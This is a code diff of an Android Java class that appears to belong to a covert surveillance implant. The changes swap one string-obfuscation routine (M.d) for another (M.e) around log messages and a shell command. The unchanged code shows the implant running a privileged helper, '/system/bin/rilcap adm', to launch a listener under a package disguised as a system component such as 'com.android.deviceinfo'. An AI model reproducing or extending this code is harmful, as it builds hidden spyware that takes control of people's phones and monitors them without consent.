@@ -158,7 +158,7 @@ public class Core extends Activity implements Runnable {
 			wl.acquire();
 		}
 
-		EvidenceReference.info(M.d("Started")); //$NON-NLS-1$
+		EvidenceReference.info(M.e("Started")); //$NON-NLS-1$
 
 		serviceRunning = true;
 		return true;
@@ -217,8 +217,8 @@ public class Core extends Activity implements Runnable {
 				// /system/bin/ntpsvd adm
 				// "com.android.deviceinfo/com.android.deviceinfo.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
-				String bd = M.d("/system/bin/rilcap adm");
-				String tbe = String.format("%s %s/%s", bd, pack, M.d("com.android.deviceinfo.listener.AR"));
+				String bd = M.e("/system/bin/rilcap adm");
+				String tbe = String.format("%s %s/%s", bd, pack, M.e("com.android.deviceinfo.listener.AR"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
@@ -562,11 +562,11 @@ public class Core extends Activity implements Runnable {
 
 			if (!loaded) {
 				// 30_2=Invalid new configuration, reverting
-				EvidenceReference.info(M.d("Invalid new configuration, reverting")); //$NON-NLS-1$
+				EvidenceReference.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
 				file.delete();
 			} else {
 				// 30_3=New configuration activated
-				EvidenceReference.info(M.d("New configuration activated")); //$NON-NLS-1$
+				EvidenceReference.info(M.e("New configuration activated")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -584,7 +584,7 @@ public class Core extends Activity implements Runnable {
 
 				if (!loaded) {
 					// Actual configuration corrupted
-					EvidenceReference.info(M.d("Actual configuration corrupted")); //$NON-NLS-1$
+					EvidenceReference.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
